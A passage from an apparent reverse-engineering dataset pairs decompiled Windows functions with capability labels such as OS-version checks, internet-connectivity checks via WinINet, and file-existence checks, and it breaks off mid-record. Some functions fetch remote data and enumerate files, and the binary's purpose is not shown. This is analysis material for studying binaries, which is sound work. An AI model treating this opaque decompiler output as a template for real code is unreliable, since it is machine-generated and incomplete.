        "decompiled_code": "\nvoid __thiscall fcn.0040bcc0(int32_t **param_1, uchar *param_2, uchar *param_3)\n\n{\n    uchar uVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    int32_t *in_FS_OFFSET;\n    uchar *var_8h;\n    uchar *var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43dcf0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    piVar3 = var_ch_2 + -var_8h;\n    piVar4 = param_1[4];\n    if (((piVar4 <= piVar3) && (param_1[5] != piVar3)) && (cVar2 = fcn.00405d10(piVar3, 1),  cVar2 != '\\0')) {\n        param_1[4] = piVar4;\n        ppiVar5 = param_1;\n        if (0xf < param_1[5]) {\n            ppiVar5 = *param_1;\n        }\n        *(ppiVar5 + piVar4) = 0;\n    }\n    var_4h = 0;\ncode_r0x0040bd30:\n    do {\n        while( true ) {\n            if (var_8h == var_ch_2) {\n                *in_FS_OFFSET = var_ch_3;\n                return;\n            }\n            uVar1 = *var_8h;\n            piVar4 = param_1[4];\n            if (-piVar4 - 1U < 2) {\n                piVar4 = fcn.0042a14e(0x4453fc);\n            }\n            piVar3 = piVar4 + 1;\n            if (piVar3 == 0xffffffff) {\n                piVar4 = fcn.0042a14e(0x4453fc);\n            }\n            if (piVar3 <= param_1[5]) break;\n            fcn.00405b70(piVar3, piVar4);\n            if (piVar3 != NULL) goto code_r0x0040bd7c;\ncode_r0x0040be0e:\n            var_8h = var_8h + 1;\n        }\n        if (piVar3 == NULL) {\n            param_1[4] = NULL;\n            if (param_1[5] < 0x10) {\n                *param_1 = 0;\n                var_8h = var_8h + 1;\n            }\n            else {\n                **param_1 = 0;\n                var_8h = var_8h + 1;\n            }\n            goto code_r0x0040bd30;\n        }\ncode_r0x0040bd7c:\n        ppiVar5 = param_1;\n        if (0xf < param_1[5]) {\n            ppiVar5 = *param_1;\n        }\n        *(ppiVar5 + param_1[4]) = uVar1;\n        param_1[4] = piVar3;\n        if (param_1[5] < 0x10) {\n            *(param_1 + piVar3) = 0;\n            goto code_r0x0040be0e;\n        }\n        *(*param_1 + piVar3) = 0;\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 824
    },
    "0040da80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040da80(uint *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_38h;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStackY8076 [20];\n    uint32_t uStackY8056;\n    uint32_t var_1f6ch_2;\n    uint var_1f74h;\n    uint var_1f5ch;\n    uint32_t var_1f58h;\n    uint var_1f50h_2;\n    uint var_1f5ch_2;\n    uint var_1f58h_2;\n    uint var_1f50h_3;\n    uint var_1fcch;\n    uint var_1fc8h;\n    uint var_1fc4h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1f90h;\n    uint var_1f88h;\n    uint var_1f6ch;\n    uint var_1f50h;\n    uint var_bc8h_2;\n    uint var_bc8h_3;\n    uint var_bc8h;\n    uint var_7e0h_2;\n    uint var_7e0h_3;\n    uint var_7e0h;\n    uint var_3f8h_2;\n    uint var_3f8h_3;\n    uint var_3f8h;\n    uint uStackY164;\n    uint arg_8h_00;\n    uint noname_1_00;\n    uint noname_2_00;\n    uint32_t in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint arg_24h;\n    uint arg_28h;\n    uint in_stack_ffffff84;\n    uint *arg_30h;\n    uint *arg_34h;\n    uint noname_13_00;\n    uint arg_48h;\n    uint var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x43de26;\n    var_ch_2 = *in_FS_OFFSET;\n    fcn.0042ae40();\n    *in_FS_OFFSET = &fcn.0040da80::var_ch_2;\n    uVar2 = *noname_0;\n    uVar3 = noname_0[1];\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042a209();\n    fcn.0042a209();\n    iVar1 = (**0x469134)();\n    if (iVar1 == 0) {\n        (**0x469258)();\n        (**0x469258)();\n    }\n    else {\n        (**0x4690ac)();\n        (**0x469258)();\n        (**0x469258)();\n    }\n    (**0x469258)();\n    fcn.004202b0(&stack0xffffe074);\n    var_4h_2 = 0;\n    fcn.0040be70(&fcn.0040da80::var_1f6ch_2);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 1);\n    arg_48h = 0x4453cc;\n    noname_13_00 = 0x446fe4;\n    arg_38h = fcn.0042d9e0();\n    arg_34h = &fcn.0040da80::var_7e0h_2;\n    arg_30h = &fcn.0040da80::var_3f8h_2;\n    noname_2_00 = 0xffffffff;\n    noname_1_00 = 0;\n    arg_28h = 0xf;\n    arg_24h = 0;\n    arg_8h_00 = 0x45627c;\n    in_stack_ffffff6c = in_stack_ffffff6c & 0xffffff00;\n    uStackY164 = 0x40dcb4;\n    fcn.00406180(0x45627c, 0, 0xffffffff);\n    uStackY164 = 0x40dcb9;\n    uVar2 = fcn.00414ea0(arg_8h_00, noname_1_00, noname_2_00, in_stack_ffffff6c, in_stack_ffffff70, in_stack_ffffff74, \n                         in_stack_ffffff78, arg_24h, arg_28h, in_stack_ffffff84, arg_30h, arg_34h, arg_38h, noname_13_00\n                         , uVar2, uVar3, arg_48h);\n    (**0x469258)();\n    if (0xf < var_1f58h) {\n        fcn.0042ac49();\n    }\n    var_1f58h = 0xf;\n    var_1f5ch = 0;\n    var_1f6ch_2 = var_1f6ch_2 & 0xffffff00;\n    var_4h_2 = 0xffffffff;\n    if (0xf < uStackY8056) {\n        fcn.0042ac49();\n    }\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    iVar1 = (**0x469150)();\n    if (iVar1 < 5) {\n        iVar1 = (**0x469150)();\n        *0x4586f0 = 1;\n        if (iVar1 != 2) {\n            *0x4586f0 = 0;\n        }\n    }\n    else {\n        uVar3 = fcn.0042b420();\n        fcn.00406270(&fcn.0040da80::var_1f50h_2, uVar3);\n        fcn.0040c070();\n        *0x4586f0 = 1;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042ad2a(uVar2);\n    return;\n}\n",
        "token_count": 1711
    },
    "0040e7c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040e7c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t arg_20h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_c9ch;\n    uint var_c98h;\n    uint var_c94h;\n    int32_t var_c90h;\n    uint var_c8ch;\n    uint var_c88h;\n    uint var_c84h;\n    uint32_t var_c80h;\n    uint var_c70h;\n    uint32_t var_c6ch;\n    uint32_t var_c64h;\n    uint var_c54h;\n    uint32_t var_c50h;\n    uint32_t var_c48h;\n    uint var_c38h;\n    uint32_t var_c34h;\n    uint var_c2ch;\n    uint var_844h;\n    uint var_45ch;\n    uint var_74h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43df51;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_c8ch = arg_14h;\n    var_c88h = arg_1ch;\n    var_c94h = arg_20h;\n    fcn.0042acb0(&var_c2ch, 0, 1000, var_10h);\n    fcn.0042acb0(&var_45ch, 0, 1000);\n    fcn.0042acb0(&var_844h, 0, 1000);\n    (**0x469258)(&var_c2ch, 0x44711c);\n    (**0x469258)(&var_c2ch, arg_8h);\n    (**0x469258)(&var_c2ch, 0x447114);\n    var_c84h = fcn.00428aa0(0, 1000000, 0);\n    var_c90h = 0;\n    uVar3 = fcn.00421020(0x1a);\n    uVar3 = fcn.00420e10(arg_10h, 0x447108, uVar3);\n    (**0x469304)(&var_45ch, uVar3);\n    uVar3 = fcn.00421020(0x1c);\n    uVar3 = fcn.00420e10(&var_45ch, 0x4470f8, uVar3);\n    (**0x469304)(&var_45ch, uVar3);\n    uVar3 = fcn.00421020(0x28);\n    uVar3 = fcn.00420e10(&var_45ch, 0x4470e8, uVar3);\n    (**0x469304)(&var_45ch, uVar3);\n    uVar3 = fcn.0041f7a0();\n    var_c34h = 0xf;\n    var_c38h = 0;\n    var_c48h = var_c48h & 0xffffff00;\n    uVar4 = fcn.0042b420(uVar3);\n    fcn.00406270(uVar3, uVar4);\n    var_4h = 0;\n    uVar3 = fcn.00406460(&var_c64h, 0x4470dc, &var_c48h);\n    var_4h._0_1_ = 1;\n    puVar5 = fcn.0040e6b0(&var_c80h, uVar3, 0x4470d0);\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    if (0xf < puVar5[5]) {\n        puVar5 = *puVar5;\n    }\n    uVar3 = fcn.00420e10(&var_45ch, 0x4470c4, puVar5);\n    (**0x469304)(&var_45ch, uVar3);\n    if (0xf < var_c6ch) {\n        fcn.0042ac49(var_c80h);\n    }\n    var_c6ch = 0xf;\n    var_c70h = 0;\n    var_c80h = var_c80h & 0xffffff00;\n    if (0xf < var_c50h) {\n        fcn.0042ac49(var_c64h);\n    }\n    var_c50h = 0xf;\n    var_c54h = 0;\n    var_c64h = var_c64h & 0xffffff00;\n    var_4h = 0xffffffff;\n    if (0xf < var_c34h) {\n        fcn.0042ac49(var_c48h);\n    }\n    var_c34h = 0xf;\n    var_c38h = 0;\n    var_c48h = var_c48h & 0xffffff00;\n    uVar3 = fcn.00421020(5);\n    uVar3 = fcn.00420e10(&var_45ch, 0x4470b8, uVar3);\n    (**0x469304)(&var_45ch, uVar3);\n    uVar3 = fcn.00421020(0x26);\n    uVar3 = fcn.00420e10(&var_45ch, 0x4470a8, uVar3);\n    (**0x469304)(&var_45ch, uVar3);\n    uVar3 = fcn.00421020(0x2a);\n    uVar3 = fcn.00420e10(&var_45ch, 0x447094, uVar3);\n    (**0x469304)(&var_45ch, uVar3);\n    uVar3 = fcn.00421020(8);\n    uVar3 = fcn.00420e10(&var_45ch, 0x447088, uVar3);\n    (**0x469304)(&var_45ch, uVar3);\n    iVar6 = (**0x4691c8)(&var_45ch, 0x447078, 0);\n    arg_20h_00 = iVar6 != 0;\n    uVar3 = 0x447064;\n    iVar6 = (**0x4691c8)(&var_45ch, 0x447064, 0);\n    if (iVar6 != 0) {\n        arg_20h_00 = 1;\n        var_c90h = 1;\n    }\n    iVar6 = (**0x4691c8)(arg_10h, 0x447058, 0);\n    uVar4 = var_c84h;\n    if (arg_20h_00 == 0) {\n        fcn.0040d920(var_c8ch, &var_45ch, var_c84h, arg_18h, arg_ch, var_c88h, 0, iVar6 != 0, 0, arg_24h);\n    }\n    else {\n        (**0x4691ec)(100, &var_74h);\n        puVar5 = &var_74h;\n        uVar4 = var_c84h;\n        while (var_c84h = uVar4,  var_74h != '\\0') {\n            iVar7 = (**0x469130)(puVar5);\n            if ((var_c90h == 0) || (iVar7 != 2)) {\n                (**0x469304)(&var_844h, &var_45ch);\n                uVar4 = fcn.00420e10(&var_844h, 0x447034, puVar5);\n            }\n            else {\n                (**0x469304)(&var_844h, &var_45ch);\n                uVar4 = fcn.00420e10(&var_844h, 0x447044, puVar5);\n            }\n            (**0x469304)(&var_844h, uVar4);\n            fcn.0040d920(var_c8ch, &var_844h, var_c84h, arg_18h, arg_ch, var_c88h, arg_20h_00, iVar6 != 0, 0, arg_24h);\n            iVar7 = (**0x469150)(puVar5);\n            pcVar1 = puVar5 + iVar7 + 1;\n            puVar5 = puVar5 + iVar7 + 1;\n            uVar4 = var_c84h;\n            var_74h._0_1_ = *pcVar1;\n        }\n    }\n    fcn.0042a030(uVar4, &var_c9ch, &var_c98h);\n    fcn.00429fe0(var_c94h, &var_c2ch, var_c9ch, var_c98h);\n    cVar2 = fcn.00408c40(uVar4);\n    if (cVar2 == '\\0') {\n        fcn.0042a0c0(uVar4);\n    }\n    else {\n        fcn.0040afd0(uVar4);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(uVar3);\n    return;\n}\n",
        "token_count": 2161
    },
    "0040fd20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040fd20(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint arg_44h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint *var_ch_2;\n    uint var_1ch_3;\n    uint32_t var_20h;\n    uint var_4h_2;\n    uint var_28h;\n    uint32_t var_3ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint uVar4;\n    uint noname_3_00;\n    uint32_t in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint arg_28h;\n    uint arg_2ch;\n    uint in_stack_ffffff68;\n    uint noname_11_00;\n    uint noname_12_00;\n    uint32_t in_stack_ffffff78;\n    uint32_t arg_40h;\n    uint var_50h_2;\n    uint var_4ch_2;\n    uint var_48h;\n    uint32_t var_34h;\n    uint var_58h;\n    uint *var_2ch_2;\n    uint var_1ch_2;\n    uint32_t var_18h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h_3;\n    \n    uStack12 = 0x43e218;\n    var_ch_3 = *in_FS_OFFSET;\n    var_10h_2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4ch_2 = noname_15;\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    var_50h_2 = 0;\n    var_4h_3._0_1_ = 2;\n    var_4h_3._1_3_ = 0;\n    arg_8h = 0;\n    arg_40h = in_stack_ffffff78 & 0xffffff00;\n    uVar1 = fcn.0042b420();\n    noname_12_00 = 0x4453cc;\n    fcn.00406270(0x4453cc, uVar1);\n    noname_11_00 = 1;\n    noname_3_00 = 0xffffffff;\n    uVar4 = 0;\n    puVar3 = &var_28h;\n    arg_2ch = 0xf;\n    arg_28h = 0;\n    var_4h_3._0_1_ = 3;\n    in_stack_ffffff50 = in_stack_ffffff50 & 0xffffff00;\n    fcn.00406180(puVar3, 0, 0xffffffff);\n    var_4h_3._0_1_ = 2;\n    uVar1 = fcn.0040ef60(&var_48h, puVar3, uVar4, noname_3_00, in_stack_ffffff50, in_stack_ffffff54, in_stack_ffffff58, \n                         in_stack_ffffff5c, arg_28h, arg_2ch, in_stack_ffffff68, noname_11_00, noname_12_00, uVar1, \n                         arg_40h);\n    var_4h_3._0_1_ = 4;\n    fcn.004063b0(uVar1);\n    var_4h_3 = CONCAT31(var_4h_3._1_3_, 2);\n    if (0xf < var_34h) {\n        fcn.0042ac49();\n    }\n    iVar2 = (**0x469288)();\n    if (iVar2 != 0) {\n        puVar3 = var_ch_2;\n        if (var_20h < 0x10) {\n            puVar3 = &var_ch_2;\n        }\n        iVar2 = fcn.0040b910(puVar3, 0, var_1ch_3);\n        if (iVar2 != -1) {\n            fcn.00405a90(0, iVar2 + var_8h);\n            puVar3 = var_2ch_2;\n            if (var_18h_2 < 0x10) {\n                puVar3 = &var_2ch_2;\n            }\n            arg_8h = fcn.0042d83d(puVar3, var_4ch_2, &var_50h_2);\n        }\n        iVar2 = (**0x469150)();\n        if (0 < iVar2) {\n            uVar4 = fcn.0042b420();\n            goto code_r0x0040fe84;\n        }\n    }\n    uVar4 = fcn.0042b420();\n    arg_8h = 0x447138;\ncode_r0x0040fe84:\n    fcn.00406270(arg_8h, uVar4);\n    var_1ch_2 = 0;\n    puVar3 = var_2ch_2;\n    if (var_18h_2 < 0x10) {\n        puVar3 = &var_2ch_2;\n    }\n    *puVar3 = 0;\n    if (0xf < var_18h_2) {\n        fcn.0042ac49();\n    }\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    if (0xf < var_20h) {\n        fcn.0042ac49();\n    }\n    var_20h = 0xf;\n    var_1ch_3 = 0;\n    var_ch_2 = var_ch_2 & 0xffffff00;\n    if (0xf < var_3ch) {\n        fcn.0042ac49();\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0042ad2a(uVar1);\n    return;\n}\n",
        "token_count": 1829
    },
    "00414d10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00414d10(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar6;\n    uint var_420h;\n    uint var_41ch;\n    uint32_t var_418h;\n    int32_t var_414h;\n    uint var_410h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e8d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar6 = 0x447144;\n    var_4h = 0;\n    var_418h = 1;\n    var_414h = 0;\n    var_10h = uVar1;\n    uVar2 = fcn.00414ac0(arg_8h);\n    iVar3 = (**0x469288)(uVar2, uVar6, uVar1);\n    if (iVar3 == 0) {\n        var_414h = 1;\n    }\n    uVar2 = (**0x4692b4)(0, 99999999);\n    iVar3 = (**0x46923c)(uVar2);\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    uVar2 = (**0x469194)(puVar4, 0, 0, 0, 0);\n    var_41ch = 600000;\n    (**0x469088)(uVar2, 2, &var_41ch, 4);\n    if (var_414h == 0) {\n        uVar6 = 0x4000100;\n    }\n    else {\n        uVar6 = 0x4800100;\n    }\n    arg_8h_00 = 0;\n    var_414h = (**0x469198)(uVar2, arg_8h, 0, 0, uVar6, 0);\n    iVar5 = 0;\n    while (var_418h != 0) {\n        (**0x4691b8)(var_414h, &var_410h, 0x400, &var_418h);\n        uVar1 = 0;\n        if (var_418h == 0) break;\n        do {\n            fcn.0042af40(iVar5 + iVar3, &var_410h + uVar1, 1);\n            uVar1 = uVar1 + 1;\n            iVar5 = iVar5 + 1;\n        } while (uVar1 < var_418h);\n    }\n    (**0x469190)(var_414h);\n    (**0x469190)(uVar2);\n    if (0xf < arg_20h) {\n        fcn.0042ac49(arg_ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 773
    },
    "00414ea0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00414ea0(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch, uint noname_6, \n            uint arg_24h, int32_t arg_28h, uint arg_2ch, int32_t arg_30h, uint arg_34h, int32_t arg_38h, uint noname_13\n            , uint noname_14, uint arg_44h, uint arg_48h)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_10h_00;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint uStackY8836;\n    int32_t iStackY8832;\n    int32_t iStackY8828;\n    int32_t iStackY8820;\n    uchar auStackY8816 [20];\n    uint32_t uStackY8796;\n    uint var_ec8h;\n    uint var_6f8h;\n    uint var_5f8h;\n    uint var_404h;\n    uint var_210h;\n    uint uStackY416;\n    int32_t iStackY412;\n    uint uStackY408;\n    uint *puStackY404;\n    uchar *puStackY400;\n    uint uStackY396;\n    int32_t iStackY392;\n    uint *puStackY388;\n    int32_t iStackY384;\n    uint *puVar4;\n    uint arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e913;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042ae40();\n    *in_FS_OFFSET = &fcn.00414ea0::var_ch;\n    iStackY8828 = arg_28h;\n    iStackY8832 = arg_30h;\n    var_4h = 0;\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    (**0x4692b4)();\n    arg_10h = (**0x46923c)();\n    fcn.0042acb0();\n    iVar1 = (**0x469194)();\n    (**0x469088)();\n    arg_8h_00 = 0x447154;\n    uStackY8836 = 0x100;\n    iStackY8820 = 0;\n    iVar2 = (**0x469288)();\n    if (iVar2 == 0) {\n        iStackY8820 = 1;\n    }\n    if (iVar1 != 0) {\n        fcn.00420ef0(0x10);\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        if (iStackY8820 == 0) {\n            iStackY8828 = (**0x4692b0)();\n        }\n        else {\n            iStackY8828 = (**0x4692b0)();\n        }\n        if ((iStackY8828 != 0) && (iVar1 = (**0x4692f4)(),  iVar1 != 0)) {\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            fcn.0040be70(&stack0xffffdd90);\n            var_4h._0_1_ = 1;\n            (**0x469258)();\n            var_4h = var_4h._1_3_ << 8;\n            if (0xf < uStackY8796) {\n                fcn.0042ac49();\n            }\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469258)();\n            (**0x469150)();\n            (**0x469150)();\n            (**0x4692b4)();\n            iStackY8820 = (**0x46923c)();\n            arg_10h_00 = (**0x469150)();\n            fcn.0042af40(iStackY8820, &fcn.00414ea0::var_210h, arg_10h_00);\n            puVar4 = &fcn.00414ea0::var_210h;\n            iVar2 = (**0x469150)();\n            fcn.0042af40(iVar2 + iStackY8820, puVar4, arg_34h);\n            (**0x469150)();\n            puVar4 = &fcn.00414ea0::var_210h;\n            iVar2 = (**0x469150)();\n            iStackY384 = 0x4154a1;\n            fcn.0042af40(iVar2 + arg_38h + iStackY8820, puVar4, arg_10h);\n            iVar2 = 0;\n            do {\n                iStackY384 = 0x4154bb;\n                iStackY384 = (**0x469150)();\n                puStackY388 = &fcn.00414ea0::var_404h;\n                uStackY396 = 0x4154ca;\n                iStackY392 = iVar1;\n                (**0x469274)();\n                uStackY396 = 0;\n                puStackY400 = &stack0xffffdd7c;\n                puStackY404 = &fcn.00414ea0::var_6f8h;\n                uStackY408 = 0x13;\n                uStackY416 = 0x4154e3;\n                iStackY412 = iVar1;\n                iVar3 = (**0x46930c)();\n                if ((iVar3 != 0) && (iVar3 = (**0x469288)(),  iVar3 == 0)) break;\n                (**0x4690c8)();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < 6);\n            iStackY384 = 0x41551e;\n            fcn.0042acb0();\n            puStackY388 = 0x41553b;\n            iStackY384 = iVar1;\n            iVar1 = (**0x4691b8)();\n            while ((iVar1 != 0 && (iStackY8832 != 0))) {\n                *(&fcn.00414ea0::var_ec8h + iStackY8832) = 0;\n                (**0x469258)();\n                iVar1 = (**0x4691b8)();\n            }\n        }\n    }\n    (**0x469190)();\n    (**0x469190)();\n    (**0x469190)();\n    if (0xf < arg_1ch) {\n        fcn.0042ac49();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1791
    },
    "004174d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_b7ch\n\nvoid __cdecl\nfcn.004174d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, int32_t arg_20h, \n            int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *unaff_ESI;\n    uint unaff_EDI;\n    uint uVar3;\n    uint var_b7ch;\n    uint var_b78h;\n    uint var_b74h;\n    uint var_b6dh;\n    uint var_b40h;\n    uint var_a2ch;\n    uint var_928h;\n    uint var_824h;\n    uint var_720h;\n    uint var_61ch;\n    uint var_518h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_b78h = arg_ch;\n    (**0x4690ac)(&fcn.004174d0::var_928h, 0x44751c, arg_10h);\n    if (arg_1ch == 0) {\n        iVar1 = (**0x469318)(&fcn.004174d0::var_928h, &fcn.004174d0::var_b6dh + 1);\n        if (iVar1 != -1) {\n            do {\n                iVar2 = (**0x469288)(&fcn.004174d0::var_b40h, 0x446e5c);\n                if (iVar2 != 0) {\n                    iVar2 = (**0x469288)(&fcn.004174d0::var_b40h, 0x446e58);\n                    if (iVar2 != 0) {\n                        fcn.0042acb0(&fcn.004174d0::var_108h, 0, 0x104);\n                        (**0x469258)(&fcn.004174d0::var_108h, &fcn.004174d0::var_b40h);\n                        (**0x4690ac)(&fcn.004174d0::var_414h, 0x447284, arg_10h, &fcn.004174d0::var_108h, *0x458364, \n                                     arg_8h);\n                        (**0x4690ac)(&fcn.004174d0::var_61ch, 0x446e60, &fcn.004174d0::var_414h, *0x457d74);\n                        (**0x4690ac)(&fcn.004174d0::var_310h, 0x447284, arg_10h, &fcn.004174d0::var_108h, *0x4581c4, \n                                 